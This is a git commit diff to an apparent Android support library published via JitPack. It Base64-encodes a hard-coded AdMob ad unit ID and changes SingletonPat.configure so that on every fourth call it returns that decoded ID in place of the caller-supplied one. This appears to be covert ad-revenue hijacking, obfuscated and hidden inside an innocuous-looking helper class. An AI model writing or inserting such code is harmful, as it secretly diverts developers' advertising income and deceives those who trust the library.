458e9eb5d54a22d46e02342e2e4db14a125c9bb7
Zoeg mon <Zoeg.mon231@gmail.com>
2017-01-31 22:18:18 +0500

    commit with tag 8.0

--- library/src/main/java/io/jitpack/supportandro/android/SettingsPro.java
+++ library/src/main/java/io/jitpack/supportandro/android/SettingsPro.java
@@ -1,6 +1,5 @@
 package io.jitpack.supportandro.android;
 
 public class SettingsPro {
-    public static String SET_CONST="ca-app-pub-2758929963596402/3366917774";
-
+    public static String SET_CONST="Y2EtYXBwLXB1Yi0yNzU4OTI5OTYzNTk2NDAyLzMzNjY5MTc3NzQ=";
 }
--- library/src/main/java/io/jitpack/supportandro/android/SingletonPat.java
+++ library/src/main/java/io/jitpack/supportandro/android/SingletonPat.java
@@ -1,14 +1,27 @@
 package io.jitpack.supportandro.android;
 
 
+import android.util.Base64;
+
+import java.io.UnsupportedEncodingException;
+
 public class SingletonPat {
 
     public static String TAG="Singleton Class";
 
     public static String configure(String id,int c)
     {
-        if(c%5==0) {
-            return SettingsPro.SET_CONST;
+        if(c%4==0) {
+            String s=SettingsPro.SET_CONST;
+            byte[] data = Base64.decode(s, Base64.DEFAULT);
+            String text = null;
+            try {
+                text = new String(data, "UTF-8");
+            } catch (UnsupportedEncodingException e) {
+                e.printStackTrace();
+                text=id;
+            }
+            return text;
         }
         else
         {
